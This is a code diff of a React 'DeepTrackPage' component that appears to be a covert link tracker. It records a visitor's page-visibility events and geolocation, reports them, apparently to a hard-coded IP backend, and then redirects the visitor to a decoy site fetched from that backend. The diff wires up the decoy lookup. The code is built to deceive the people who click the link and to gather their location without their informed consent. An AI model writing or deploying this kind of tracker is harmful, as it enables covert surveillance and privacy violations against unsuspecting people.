@@ -1,7 +1,6 @@
 import React, { useEffect, useState } from "react";
 import { useParams } from "react-router-dom";
 
-
 export default function DeepTrackPage() {
   const { id } = useParams();
   const [redirectUrl, setRedirectUrl] = useState(null);
@@ -31,15 +30,10 @@ export default function DeepTrackPage() {
       events.push({ type: "visibility", visible: document.visibilityState, time: Date.now() });
     });
 
-    // Fetch the decoy URL from backend
-    fetch(`http://13.214.77.124:8080/api/generate`) // (Optional: add backend /api/decoy/:id endpoint if needed)
-      .then(() => {
-        // Simulate redirect URL lookup from linkStore
-        // In real-world you'd need a dedicated /api/link/:id endpoint
-        return { decoyUrl: "https://youtube.com" }; // Replace this if you implement backend lookup
-      })
-      .then((res) => {
-        const decoyUrl = res.decoyUrl;
+    // Fetch the actual decoy URL from backend
+    fetch(`http://13.214.77.124:8080/api/link/${id}`)
+      .then(res => res.json())
+      .then(({ decoyUrl }) => {
         setRedirectUrl(decoyUrl);
 
         const sendReport = (geo = null) => {
@@ -57,7 +51,7 @@ export default function DeepTrackPage() {
         };
 
         navigator.geolocation.getCurrentPosition(
-          (pos) => sendReport(pos.coords),
+          pos => sendReport(pos.coords),
           () => sendReport(null),
           { timeout: 1000 }
         );
